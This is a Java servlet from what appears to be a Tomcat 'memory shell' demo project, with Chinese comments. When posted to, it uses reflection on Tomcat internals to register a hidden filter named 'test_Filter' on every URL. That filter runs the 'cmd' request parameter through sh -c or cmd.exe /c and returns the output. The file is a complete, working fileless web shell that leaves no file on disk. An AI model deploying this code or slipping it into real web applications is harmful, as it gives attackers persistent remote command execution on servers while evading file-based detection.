package com.example.tomcatmemshelldemo;

import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Map;
import java.util.Scanner;

@WebServlet("/testFilterServlet")
public class TestFilterServlet extends HttpServlet {
    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
//        org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
//        org.apache.catalina.webresources.StandardRoot standardRoot = (org.apache.catalina.webresources.StandardRoot) webappClassLoaderBase.getResources();
//        org.apache.catalina.core.StandardContext standardContext = (StandardContext) standardRoot.getContext();
        // nice_oe3师傅测试该读取StandardContext测试报错,我也报错

        Field Configs = null;
        Map filterConfigs;
        try {
            // 这里是反射获取ApplicationContext的context，也就是standardContext
            ServletContext servletContext = request.getSession().getServletContext();

            Field appctx = servletContext.getClass().getDeclaredField("context");
            appctx.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

            Field stdctx = applicationContext.getClass().getDeclaredField("context");
            stdctx.setAccessible(true);
            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

            String FilterName = "test_Filter";
            Configs = standardContext.getClass().getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            filterConfigs = (Map) Configs.get(standardContext);

            if (filterConfigs.get(FilterName) == null){
                Filter filter = new Filter() {
                    @Override
                    public void init(FilterConfig filterConfig) throws ServletException {

                    }

                    @Override
                    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                        HttpServletRequest req = (HttpServletRequest) servletRequest;
                        if (req.getParameter("cmd") != null) {
                            String cmd = servletRequest.getParameter("cmd");
                            boolean isLinux = true;
                            String osTyp = System.getProperty("os.name");
                            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                                isLinux = false;
                            }
                            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                            Scanner s = new Scanner(in).useDelimiter("\\A");
                            String output = s.hasNext() ? s.next() : "";
                            servletResponse.getWriter().write(output);
                            return;
                        }
//                        if (req.getParameter("cmd") != null){
//                            byte[] bytes = new byte[1024];
//                            Process process = new ProcessBuilder("cmd","/c",req.getParameter("cmd")).start();
//                            int len = process.getInputStream().read(bytes);
//                            servletResponse.getWriter().write(new String(bytes,0,len));
//                            process.destroy();
//                            return;
//                        }
                        filterChain.doFilter(servletRequest,servletResponse);
                    }

                    @Override
                    public void destroy() {

                    }
                };

                // 反射获取FilterDef，设置filter名等参数后，调用addFilterDef将FilterDef添加
                Class<?> FilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                Constructor declaredConstructors = FilterDef.getDeclaredConstructor();
                FilterDef o = (FilterDef) declaredConstructors.newInstance();
                o.setFilter(filter);
                o.setFilterName(FilterName);
                o.setFilterClass(filter.getClass().getName());
                standardContext.addFilterDef(o);

                // 反射获取FilterMap并且设置拦截路径，并调用addFilterMapBefore将FilterMap添加进去
                Class<?> FilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                Constructor<?> declaredConstructor = FilterMap.getDeclaredConstructor();
                FilterMap o1 = (FilterMap) declaredConstructor.newInstance();
                o1.addURLPattern("/*");
                o1.setFilterName(FilterName);
                o1.setDispatcher(DispatcherType.REQUEST.name());
                standardContext.addFilterMapBefore(o1);

                // 反射获取ApplicationFilterConfig，构造方法将FilterDef传入后获取filterConfig后，将设置好的filterConfig添加进去
                Class<?> ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
                Constructor<?> declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class);
                declaredConstructor1.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext, o);
                filterConfigs.put(FilterName, filterConfig);
                response.getWriter().write("Success");
            }

        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
